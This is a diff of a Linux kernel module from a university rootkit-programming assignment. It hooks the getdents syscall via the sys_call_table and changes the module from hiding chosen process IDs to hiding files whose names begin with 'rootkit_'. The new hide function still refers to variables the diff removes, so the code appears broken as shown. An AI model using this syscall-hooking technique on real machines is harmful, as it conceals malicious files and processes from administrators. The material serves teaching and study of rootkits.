@@ -1,5 +1,5 @@
 /*
- * Assignment 03 for the course Rootkit Programming at TUM in WS2014/15.
+ * Assignment 04 for the course Rootkit Programming at TUM in WS2014/15.
  * Implemented by Guru Chandrasekhara and Martin Herrmann.
  */
 #include <asm/page.h>
@@ -24,15 +24,11 @@ MODULE_AUTHOR("Guru Chandrasekhara, Martin Herrmann");
 void **sys_call_table;
 asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
+/*
+ * counter to ensure every process has left our manipulated syscall before
+ * we unload our module.
+ */
 static int call_counter = 0;
-
-
-static int processes[16] = {-1, -1, -1 , -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1};
-static int argcount = 0;
-
-/* Define module parameters */
-module_param_array(processes, int, &argcount, 0000);
-MODULE_PARM_DESC(processes, "An array of process ids to hide. Must contain at least one and no more than 16 pids.");
 
 struct linux_dirent {   
         unsigned long   d_ino;   
@@ -41,31 +37,18 @@ struct linux_dirent {
         char            d_name[1];   
  };   
 
-/* get PID from the name */
-int convert_atoi(char *str)
-{
-	int res = 0;
-	int mul = 1;
-	char *ptr;
-
-	for(ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
-		if(*ptr < '0' || *ptr > '9')
-			return(-1);
-		res += (*ptr - '0') * mul;
-		mul *= 10;
-	}
-	return(res);
-}
-
-/* Check whether we need to hide this pid */
-int hide(pid_t pid)
+/* Check whether we need to hide this file */
+int hide(char *d_name)
 {
 	int i = 0;
 	if(pid)
 	{
 		for(i=0;i<argcount;i++)
 		{
-		 if(processes[i] == pid ) return 1;	
+			if(strstr(d_name, "rootkit_") == d_name) 
+			{
+				return 1;
+			}
 		}
 	}	
 
@@ -74,7 +57,7 @@ int hide(pid_t pid)
 
    
 /*
- * Our manipulated getdents syscall. It checks whether a particular process needs to hided,
+ * Our manipulated getdents syscall. It checks whether a particular file needs to be hidden,
  * if matches then don't show otherwise works normally and calls the original getdents.
  */
 asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
@@ -98,7 +81,7 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 		 * convert_atoi return the pid of every process in integer format,
 		 * hide will compare the pid against the user entered processes.
 		 */		
-		if((hide(convert_atoi(dirp->d_name))))
+		if(hide(dirp->d_name))
 		{	
 			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
 			ret -= len;
@@ -111,11 +94,9 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 
 	}
 	
+	/* nothing else below this line */
 	call_counter--;
 	return ret;
-
-	/* nothing else below this line */
-//	return -1;
 }
 
 
@@ -153,20 +134,7 @@ static void enable_page_protection (void)
  * Prints a welcome-message and replaces the getdents syscall.
  */
 int init_module (void)
-{
-	//int i;
-	//struct task_struct *tasks[16];	
-
-	/* check the number of arguments */
-	if(argcount > 16)
-	{
-		return -E2BIG;
-	}		
-	if(argcount <= 0)
-	{
-		return -EINVAL;
-	}
-	
+{	
 	printk(KERN_INFO "Loading process-hider LKM...\n");
 	
 	/* get the pointer to the sys_call_table */
